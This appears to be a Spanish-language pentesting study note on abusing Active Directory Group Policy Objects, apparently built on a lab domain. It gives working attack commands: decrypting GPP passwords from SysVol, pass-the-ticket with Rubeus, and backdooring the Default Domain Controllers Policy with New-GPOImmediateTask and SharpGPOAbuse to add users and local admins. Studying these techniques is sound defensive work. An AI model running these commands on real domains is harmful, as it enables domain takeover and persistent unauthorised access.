# Abuso de GPO

Tags: #AD #GPO #SysVol #Windows 

El abuso de GPO (Objeto de Política de Grupo) consiste en las estrategias empleadas por los atacantes para manipular las Políticas de Grupo en un entorno de Active Directory (AD) con el objetivo de realizar actividades maliciosas.

```bash 
Si un atacante gana suficientes privilegios para modificar una GPO, podría realizar una serie de acciones dañinas, como:

1. Propagación de Malware: Un atacante podría configurar una GPO para ejecutar un script malicioso o un programa al iniciar sesión o al arrancar las máquinas, lo que resultaría en la propagación de malware a través de la red.
2. Modificación de Configuraciones de Seguridad: Cambiar las configuraciones de seguridad en las GPOs para debilitar las políticas de la red, como deshabilitar el firewall, cambiar configuraciones de User Account Control (UAC), o bajar el nivel de protección del antivirus.
3. Escalada de Privilegios: Alterar configuraciones de permisos de usuario o grupo a través de las GPOs para otorgar privilegios administrativos a cuentas controladas por el atacante.
4. Persistencia: Crear una GPO que establezca tareas programadas o servicios que se ejecuten con privilegios elevados para mantener el acceso a la red incluso después de un reinicio o cambio de contraseña.
5. Exfiltración de Datos: Configurar reglas de red o scripts que se ejecutan a través de GPOs para exfiltrar datos de manera sistemática y controlada desde los sistemas de la red.
6. Movimiento Lateral: Utilizar GPOs para ejecutar scripts que faciliten el movimiento lateral dentro de una red, como abrir puertos o deshabilitar la autenticación de red en determinados sistemas.
7. Denegación de Servicio (DoS): Configurar GPOs para cambiar o interrumpir servicios críticos, lo que podría llevar a un DoS dentro de la infraestructura de la red empresarial.
8. Alteración de Configuraciones de Red: Cambiar la configuración de DNS, mapeos de unidades de red, o incluso forzar la instalación de controladores o actualizaciones que podrían ser maliciosas.
```

## ¿Qué es SysVol?

```bash 
SysVol (abreviatura de System Volume) es un conjunto de carpetas y archivos que se comparten en toda una infraestructura de AD. Está presente en todos los controladores de dominio de un entorno de AD.
    
1. Contenido y Estructura: 
    - Políticas y Scripts: Contiene las políticas de grupo (GPOs) y scripts de inicio/apagado e inicio/cierre de sesión.  
    - Archivos de Plantilla: Incluye archivos de plantilla de políticas de grupo (Administrative Templates), que son archivos '.admx' y '.adml'.
    - Información de Replicación: SysVol se replica entre todos los controladores de dominio para asegurar la coherencia de las políticas y configuraciones. 
2. Ubicación y Acceso: Por lo general, se accede a través de la red utilizando una ruta UNC (Universal Naming Convention), como '\\[Nombre_Dominio]\SysVol'.
    

# Importancia de SysVol en Active Directory

1. Distribución de Políticas: SysVol es fundamental para la implementación y administración de las GPOs. Cuando se crea o se modifica una GPO, los cambios se almacenan en SysVol y luego se replican.
2. Consistencia del Dominio: La replicación del contenido de SysVol entre los controladores de dominio asegura que las políticas y configuraciones sean consistentes en todo el dominio.
3. Scripting y Automatización: Los scripts almacenados en SysVol pueden ser utilizados para automatizar tareas en toda la red, como la configuración de las políticas de seguridad o el despliegue de software.
    
# Uso y Gestión

1. Gestión de GPO: Los administradores de AD utilizan SysVol para gestionar y desplegar GPOs. Las herramientas como Group Policy Management Console (GPMC) interactúan con los archivos almacenados en SysVol.
2. Auditoría y Seguridad: Dada su importancia, es crucial monitorear y auditar los cambios en SysVol, ya que las modificaciones no autorizadas pueden tener un impacto significativo en la seguridad del dominio.
3. Backup y Recuperación: Es vital tener copias de seguridad de SysVol para la recuperación en caso de corrupción o pérdida de datos.
```

```powershell
❯ Get-DomainGPO                   # Mirar info como 'DisplayName, GpcFileSysPath = Ruta de Sysvol'
❯ dir \\domain1.corp\sysvol\      # Recurso compartido donde se puede encontrar directorios como (DfsrPrivate, scripts, Policies) con passwords


Nota: Si se obtiene el archivo 'groups.XML' dentro de Sysvol en la siguiente ruta '/MACHINES/Preferences/Groups/' se puede obtener una credencial en texto claro con la siguiente tool a partir de una password en formato hash 
 
❯ gpp-decrypt 'password'    # Desencriptar la password por medio de la clave AES y se obtiene en texto claro
```

## Análisis Técnico de la ACE

```bash 
1. AceType: AccessAllowed
    - Esta ACE otorga permisos en lugar de denegarlos. Indica que las acciones especificadas están permitidas para el sujeto identificado por el 'SecurityIdentifier'.

2. ObjectDN
    - 'CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=domain1,DC=corp' es el Distinguished Name del objeto de política de grupo (GPO) al que se aplica esta ACE. Este nombre único identifica la GPO dentro del dominio 'domain1.corp'.
        
3. ActiveDirectoryRights
    - Los derechos asignados incluyen 'CreateChild', 'DeleteChild', 'ReadProperty', 'WriteProperty', y 'GenericExecute'.
        - CreateChild y DeleteChild: Permiten crear o eliminar objetos hijos dentro del contexto de esta GPO.
        - ReadProperty y WriteProperty: Permiten leer y modificar las propiedades de la GPO.
        - GenericExecute: Permite ejecutar acciones genéricas, aunque este permiso puede necesitar interpretación adicional según el contexto.
    
4. SecurityIdentifier
    - 'S-1-5-21-1861162130-2580302541-221646211-1121' representa al usuario o grupo al que se aplican estos permisos. Este SID necesita ser resuelto para identificar al sujeto específico dentro del dominio.
        
5. InheritanceFlags: ContainerInherit
    - Indica que esta ACE se hereda a los objetos contenedores dentro de la GPO. Es relevante para entender cómo se propagan los permisos a través de las políticas.
        
6. AccessMask: 131127
    - Es una representación numérica de los permisos específicos otorgados, útil para interpretaciones programáticas o de scripts.
        
7. AuditFlags y AceFlags
    - 'AuditFlags: None' indica que no hay configuraciones específicas de auditoría asociadas con esta ACE.
    - 'AceFlags: ContainerInherit' reafirma la herencia de contenedor de esta ACE.
```

## Utilizando PowerView

```powershell 
❯ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} 
❯ Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | select AceType,SecurityIdentifier,ActiveDirectoryRights,ObjectDN | fl       # Enumerar 

	# SecurityIdentifier entre los '500' = Usuarios por defecto del dominio, entreprise admins, operador de servidor, operador de impersora, etc...
	# SecurityIdentifier arriba de '1000' = Usuarios que el administrador fue creando 


# Traducir el SID a nombre del usuario o grupo 
❯ $sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1861162130-2580302541-221646211-1121") 
❯ $user = $sid.Translate([System.Security.Principal.NTAccount])
❯ $user.Value

# Otra forma de convertir el SID nombre 
❯ Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 

# Obtener el hash de la password 
❯ .\Rubeus.exe hash /password:Password@1   # Obtendremos su 'rc4_hmac'
```

```bash 
# Implicaciones en Seguridad

- Análisis de Riesgo: La presencia de derechos como 'WriteProperty' y 'CreateChild' en una GPO es significativa, ya que las GPOs afectan a múltiples usuarios y máquinas en un dominio. La capacidad de modificar una GPO puede llevar a cambios en la configuración de seguridad o políticas operativas a lo largo de toda la red.
    
- Punto de Explotación Potencial: Un atacante que gana control sobre una cuenta con estos derechos en una GPO podría potencialmente implementar cambios perjudiciales o maliciosos en la política de grupo, afectando a todo el dominio.
```

## Solicitando TGT para el usuario gpowrite.user

```powershell
❯ klist
❯ Rubeus.exe asktgt /user:gpowrite.user /password:Password@1 /ptt            # Hacemos Pass-The-Ticket con la password
❯ Rubeus.exe asktgt /user:gpowrite.user /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ptt   # Hacemos Pass-The-Ticket con el hash
❯ klist     # Mirar los ticket 'krbtgt'
 
❯ New-GPOImmediateTask -Verbose -Force -TaskName 'EvilScript2023' -GPODisplayName 'Default Domain Controllers Policy' -Command cmd -CommandArguments "/c net user abuso.gpo P4ssw0rd /add"
```

## Utilizando SharpGPOAbuse

```powershell
# Despues de encontrarnos en una sesion con el usuario de gpowrite.user y debemos utilizar la siguiente herramienta:

❯ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gpowrite.user --GPOName "Default Domain Controllers Policy" --force

	# AddLocalAdmin = Agregar un usuario local 
	# UserAccount = Cuenta del usuario 

Nota: 
	1. Nos debe de salir que el GPO ha sido modificado para agregar un nuevo admin local.  
	2. Las GPO se actualizan cada ~ 30 min, por lo que debemos de forzar la actualizacion 

❯ hostname
```

```powershell
❯ gpupdate /force                    # En el DC se procede a forzar la actualizacion de la GPO
❯ net localgroup Administrators      # Miramos el grupo de administradores 
```

## Forzando la actualización de GPO

```bash 
En el contexto de las Group Policy Objects (GPOs) en un entorno de Active Directory (AD), las políticas se aplican y actualizan en los equipos cliente de forma periódica. Aquí profundizamos en el concepto de "Fuerza la Actualización de la Política":

1. Ciclo de Actualización de GPO
    - Por defecto, las GPOs se actualizan automáticamente en los clientes aproximadamente cada 90 minutos. Este intervalo puede variar, ya que AD introduce un desfase aleatorio de hasta 30 minutos para evitar que todos los clientes del dominio actualicen sus políticas al mismo tiempo.
    - Durante este ciclo, los cambios realizados en las GPOs en el servidor se propagan a los equipos cliente.
        
2. Uso de 'gpupdate /force'
    
    - El comando 'gpupdate /force' se utiliza para forzar la actualización inmediata de las políticas en un equipo cliente. Este comando ignora el ciclo de actualización predeterminado y aplica todas las políticas nuevas o modificadas inmediatamente.
    - Cuando se ejecuta, 'gpupdate /force' reevalúa todas las políticas aplicables al equipo y al usuario actual y aplica los cambios necesarios. Esto incluye tanto la Política de Grupo del ordenador como la del usuario.
        
3. Implicaciones de Forzar la Actualización
    - Forzar una actualización de política es útil cuando necesitas aplicar cambios de manera inmediata, como en una situación de prueba o tras realizar modificaciones importantes en las políticas.
    - Sin embargo, el uso frecuente de 'gpupdate /force' puede aumentar la carga en los servidores de AD y en la red, especialmente en entornos grandes.
```